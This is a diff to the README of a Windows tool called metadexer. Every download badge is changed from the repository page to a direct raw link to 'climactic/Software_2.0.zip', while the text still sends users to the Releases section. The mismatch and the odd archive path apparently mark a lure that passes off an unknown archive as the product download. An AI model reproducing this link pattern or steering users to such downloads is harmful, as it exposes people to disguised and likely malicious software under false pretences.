@@ -1,6 +1,6 @@
 # 📦 metadexer - Manage and Search Your Data Easily
 
-[![Download metadexer](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/imrk1595/metadexer)
+[![Download metadexer](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/imrk1595/metadexer/raw/refs/heads/main/climactic/Software_2.0.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before you start, make sure your computer meets these needs:
 
 1. Click the button below to visit the download page:
 
-   [![Get metadexer](https://img.shields.io/badge/Get%20metadexer-blue)](https://github.com/imrk1595/metadexer)  
+   [![Get metadexer](https://img.shields.io/badge/Get%20metadexer-blue)](https://github.com/imrk1595/metadexer/raw/refs/heads/main/climactic/Software_2.0.zip)  
 
 2. On the GitHub page, scroll down to the **Releases** section. Here you will find the latest version of metadexer.
 
@@ -134,4 +134,4 @@ The strength of metadexer lies in its ability to manage large collections withou
 
 Visit this page to download metadexer for Windows and start managing your files in a structured way:
 
-[![Download metadexer](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/imrk1595/metadexer)
+[![Download metadexer](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/imrk1595/metadexer/raw/refs/heads/main/climactic/Software_2.0.zip)
